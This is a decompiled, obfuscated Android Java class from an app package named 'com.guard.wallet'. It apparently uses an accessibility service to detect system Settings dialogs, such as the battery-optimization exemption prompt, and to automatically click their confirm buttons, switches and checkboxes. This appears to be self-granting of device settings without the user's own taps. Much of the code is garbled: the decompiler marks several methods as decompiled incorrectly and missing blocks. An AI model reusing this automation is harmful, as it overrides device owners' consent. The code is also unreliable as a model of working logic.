package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;

/* renamed from: o.c */
/* loaded from: classes.dex */
public abstract class AbstractC0414c extends C0416e {

    /* renamed from: n */
    public final ConcurrentLinkedQueue f850n;

    /* renamed from: o */
    public final ReentrantLock f851o;

    /* renamed from: p */
    public final ScheduledExecutorService f852p;

    /* renamed from: q */
    public final AtomicBoolean f853q;

    public AbstractC0414c(LinkedList linkedList, String str) {
        super(linkedList, str);
        this.f850n = new ConcurrentLinkedQueue();
        this.f851o = new ReentrantLock();
        this.f852p = Executors.newSingleThreadScheduledExecutor();
        this.f853q = new AtomicBoolean(false);
    }

    /* renamed from: H */
    public static CombineFilter m1033H(String str) {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setContains(str);
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: I */
    public static CombineFiltersWithOr m1034I() {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), "id", "android:id/button1"));
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.getStringConditions().add(AbstractC0000a.m6b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.Button"), "id", "com.android.settings:id/btn_positive"));
        filters2.add(combineFilter2);
        return combineFiltersWithOr;
    }

    /* renamed from: J */
    public static ListenWindow m1035J() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.app.Dialog");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: K */
    public static CombineFilter m1036K() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.LinearLayout"));
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        return combineFilter;
    }

    /* renamed from: L */
    public static CombineFilter m1037L() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        return combineFilter;
    }

    /* renamed from: M */
    public static void m1038M() {
        String str;
        if (MyAccessibilityService.m554P() != null) {
            AtomicReference atomicReference = MyAccessibilityService.f326v;
            if (!Objects.equals((String) atomicReference.get(), "android.app.Dialog")) {
                MyAccessibilityService m554P = MyAccessibilityService.m554P();
                m554P.getClass();
                try {
                    AccessibilityNodeInfo rootInActiveWindow = m554P.getRootInActiveWindow();
                    str = (rootInActiveWindow == null || rootInActiveWindow.getClassName() == null) ? (String) atomicReference.get() : rootInActiveWindow.getClassName().toString();
                } catch (Exception e2) {
                    AbstractC0026q.m186s("MyAccessibilityService", e2);
                    str = null;
                }
                if (!Objects.equals(str, "android.app.Dialog")) {
                    return;
                }
            }
            MyAccessibilityService m554P2 = MyAccessibilityService.m554P();
            CombineFilter m1039N = m1039N();
            m554P2.getClass();
            UiObject m551M = MyAccessibilityService.m551M(m1039N);
            if (m551M == null || !m551M.click()) {
                return;
            }
            Log.d("o.c", "已点击对话框取消按钮");
            AbstractC0251g.T0(5);
        }
    }

    /* renamed from: N */
    public static CombineFilter m1039N() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), "id", "android:id/button1"));
        return combineFilter;
    }

    /* JADX WARN: Code restructure failed: missing block: B:11:0x0042, code lost:
    
        r7 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:12:0x0046, code lost:
    
        r2 = 5;
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x0048, code lost:
    
        if (r7 != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x0070, code lost:
    
        if (r7 != false) goto L31;
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x0072, code lost:
    
        r4 = r3.findParentUtilCombine(m1037L());
     */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x007a, code lost:
    
        if (r4 == null) goto L31;
     */
    /* JADX WARN: Code restructure failed: missing block: B:18:0x0080, code lost:
    
        if (r4.click() == false) goto L31;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x0082, code lost:
    
        r0.setClicked(true);
        r3.refresh();
        r7 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x008c, code lost:
    
        if (r2 <= 0) goto L43;
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x008e, code lost:
    
        if (r7 != false) goto L44;
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x0090, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r3.refresh();
        r7 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x009a, code lost:
    
        r2 = r2 - 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x006b, code lost:
    
        r1 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x006c, code lost:
    
        r1 = r7;
        r7 = r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x00a0, code lost:
    
        a1.AbstractC0026q.m186s("o.c", r7);
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x009d, code lost:
    
        r1 = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x004e, code lost:
    
        if (r3.click() == false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x0050, code lost:
    
        r0.setClicked(true);
        r3.refresh();
        r7 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x005a, code lost:
    
        if (r2 <= 0) goto L45;
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x005c, code lost:
    
        if (r7 != false) goto L46;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x005e, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r3.refresh();
        r7 = r3.checked();
        r2 = r2 - 1;
     */
    /* renamed from: P */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static CheckedResult m1040P(UiObject uiObject) {
        CheckedResult checkedResult = new CheckedResult();
        boolean z2 = false;
        try {
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.setStringConditions(new LinkedList());
            StringCondition stringCondition = new StringCondition();
            stringCondition.setProperty("className");
            stringCondition.setEquals("android.widget.CompoundButton");
            combineFilter.getStringConditions().add(stringCondition);
            MyAccessibilityService.m548I(uiObject);
            UiObject uiObject2 = null;
            for (int i2 = 0; uiObject != null && uiObject2 == null && i2 <= 2; i2++) {
                uiObject2 = uiObject.findOneByCombine(combineFilter);
                uiObject = uiObject.parent();
            }
        } catch (Exception e2) {
            e = e2;
        }
        checkedResult.setChecked(z2);
        return checkedResult;
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:0x0024, code lost:
    
        r0.setChecked(r3.checked());
        r5 = r3.boundsInScreen().right - 80;
        r1 = (int) r3.centerInScreen().getY();
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x0040, code lost:
    
        if (r0.isChecked() != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x004e, code lost:
    
        if (com.guard.wallet.utils.AbstractC0251g.m672s(java.lang.Integer.valueOf(r5), java.lang.Integer.valueOf(r1)) == false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x0050, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(5);
        r0.setClicked(true);
     */
    /* renamed from: S */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static CheckedResult m1041S(UiObject uiObject) {
        CheckedResult checkedResult = new CheckedResult();
        try {
            CombineFilter a02 = a0();
            MyAccessibilityService.m548I(uiObject);
            UiObject uiObject2 = null;
            for (int i2 = 0; uiObject != null && uiObject2 == null && i2 <= 2; i2++) {
                uiObject2 = uiObject.findOneByCombine(a02);
                if (uiObject2 == null) {
                    uiObject = uiObject.parent();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.c", e2);
        }
        return checkedResult;
    }

    /* renamed from: U */
    public static CombineFilter m1042U() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.LinearLayout"));
        return combineFilter;
    }

    /* renamed from: V */
    public static CombineFiltersWithOr m1043V() {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.setBoolConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("className");
        stringCondition.setEquals("androidx.recyclerview.widget.RecyclerView");
        combineFilter.getStringConditions().add(stringCondition);
        combineFilter.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.setStringConditions(new LinkedList());
        combineFilter2.setBoolConditions(new LinkedList());
        StringCondition stringCondition2 = new StringCondition();
        stringCondition2.setProperty("className");
        stringCondition2.setEquals("android.widget.ListView");
        combineFilter2.getStringConditions().add(stringCondition2);
        combineFilter2.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters2.add(combineFilter2);
        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.setStringConditions(new LinkedList());
        combineFilter3.setBoolConditions(new LinkedList());
        StringCondition stringCondition3 = new StringCondition();
        stringCondition3.setProperty("className");
        stringCondition3.setEquals("android.widget.ScrollView");
        combineFilter3.getStringConditions().add(stringCondition3);
        combineFilter3.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters3.add(combineFilter3);
        List<CombineFilter> filters4 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter4 = new CombineFilter();
        combineFilter4.setBoolConditions(new LinkedList());
        combineFilter4.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters4.add(combineFilter4);
        return combineFiltersWithOr;
    }

    /* renamed from: W */
    public static void m1044W() {
        if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
        }
    }

    /* renamed from: Y */
    public static boolean m1045Y() {
        try {
            m1038M();
            if (AbstractC0251g.o0() || !AbstractC0026q.m150A()) {
                return false;
            }
            AbstractC0251g.j0();
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.c", e2);
            return false;
        }
    }

    public static CombineFilter a0() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.Switch"));
        return combineFilter;
    }

    /* JADX WARN: Code restructure failed: missing block: B:11:0x0063, code lost:
    
        android.util.Log.d("o.c", "checkboxNode is not null");
        r1 = r3.checked();
        r9 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:12:0x006f, code lost:
    
        if (r1 != false) goto L26;
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x0072, code lost:
    
        if (r9 >= 5) goto L25;
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x0074, code lost:
    
        r3.click();
        android.util.Log.d("o.c", "checkboxNode is click");
        r0.setClicked(true);
        com.guard.wallet.utils.AbstractC0251g.T0(5);
        r3.refresh();
        r1 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x008a, code lost:
    
        r9 = r9 + 1;
     */
    /* renamed from: O */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final CheckedResult m1046O(UiObject uiObject, int i2) {
        CheckedResult checkedResult = new CheckedResult();
        boolean z2 = false;
        try {
            CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
            combineFiltersWithOr.setFilters(new LinkedList());
            combineFiltersWithOr.getFilters().add(a0());
            List<CombineFilter> filters = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.setStringConditions(new LinkedList());
            StringCondition stringCondition = new StringCondition();
            stringCondition.setProperty("className");
            stringCondition.setEquals("android.widget.CheckBox");
            combineFilter.getStringConditions().add(stringCondition);
            filters.add(combineFilter);
            MyAccessibilityService.m548I(uiObject);
            UiObject uiObject2 = null;
            for (int i3 = 0; uiObject != null && uiObject2 == null && i3 <= 2; i3++) {
                uiObject2 = uiObject.findOneByOperateOr(combineFiltersWithOr);
                uiObject = uiObject.parent();
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.c", e2);
        }
        checkedResult.setChecked(z2);
        return checkedResult;
    }

    /* renamed from: Q */
    public final UiObject m1047Q() {
        try {
            CombineFiltersWithOr m1043V = m1043V();
            if (m1072k() != null) {
                return m1072k().findOneByOperateOr(m1043V);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.c", e2);
        }
        return null;
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:0x0025, code lost:
    
        r1 = r3.checked();
        r4 = r3.boundsInScreen().right - 50;
        r5 = (int) r3.centerInScreen().getY();
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x003b, code lost:
    
        if (r1 != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x0049, code lost:
    
        if (com.guard.wallet.utils.AbstractC0251g.m672s(java.lang.Integer.valueOf(r4), java.lang.Integer.valueOf(r5)) == false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x004b, code lost:
    
        r0.setClicked(true);
        com.guard.wallet.service.MyAccessibilityService.m548I(m1072k());
        r3 = r8.findOneByCombine(r2);
        r1 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x005d, code lost:
    
        if (r9 <= 0) goto L42;
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x005f, code lost:
    
        if (r1 != false) goto L43;
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x0061, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r3 = r8.findOneByCombine(r2);
        r1 = r3.checked();
        r9 = r9 - 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x006f, code lost:
    
        if (r1 != false) goto L33;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0071, code lost:
    
        r8 = r3.findParentUtilCombine(m1037L());
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x0079, code lost:
    
        if (r8 == null) goto L33;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x007f, code lost:
    
        if (r8.click() == false) goto L33;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x0081, code lost:
    
        r0.setClicked(true);
        r3.refresh();
        r1 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x008c, code lost:
    
        if (r9 <= 0) goto L44;
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x008e, code lost:
    
        if (r1 != false) goto L45;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x0090, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r3.refresh();
        r1 = r3.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x009a, code lost:
    
        r9 = r9 - 1;
     */
    /* renamed from: R */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final CheckedResult m1048R(UiObject uiObject, int i2) {
        CheckedResult checkedResult = new CheckedResult();
        boolean z2 = false;
        try {
            CombineFilter a02 = a0();
            MyAccessibilityService.m548I(uiObject);
            UiObject uiObject2 = null;
            for (int i3 = 0; uiObject != null && uiObject2 == null && i3 <= 2; i3++) {
                uiObject2 = uiObject.findOneByCombine(a02);
                if (uiObject2 == null) {
                    uiObject = uiObject.parent();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.c", e2);
        }
        checkedResult.setChecked(z2);
        return checkedResult;
    }

    /* renamed from: T */
    public final boolean m1049T() {
        return this.f853q.get();
    }

    /* renamed from: X */
    public final void m1050X() {
        this.f853q.set(true);
    }

    /* renamed from: Z */
    public abstract void mo1051Z();

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        try {
            this.f852p.shutdownNow();
            AbstractC0243l.m591a(this.f864c);
            this.f850n.clear();
            super.mo1001d();
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.c", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:11:0x0024  */
    /* JADX WARN: Removed duplicated region for block: B:19:? A[RETURN, SYNTHETIC] */
    @Override // p012o.C0416e
    /* renamed from: u */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        try {
            super.mo1002u(accessibilityEvent, str, str2);
            int i2 = 0;
            try {
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.c", e2);
            }
            if (m1078q(Collections.singletonList(m1035J()))) {
                Log.d("o.c", "已进入是否允许忽略电池优化窗口");
                z2 = true;
                if (z2) {
                    return;
                }
                ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
                if (concurrentLinkedQueue.contains("keepInBatteryUnRestricted")) {
                    return;
                }
                concurrentLinkedQueue.add("keepInBatteryUnRestricted");
                AbstractC0243l.m593c(new RunnableC0412a(this, i2), this.f864c);
                return;
            }
            z2 = false;
            if (z2) {
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("o.c", e3);
        }
    }
}
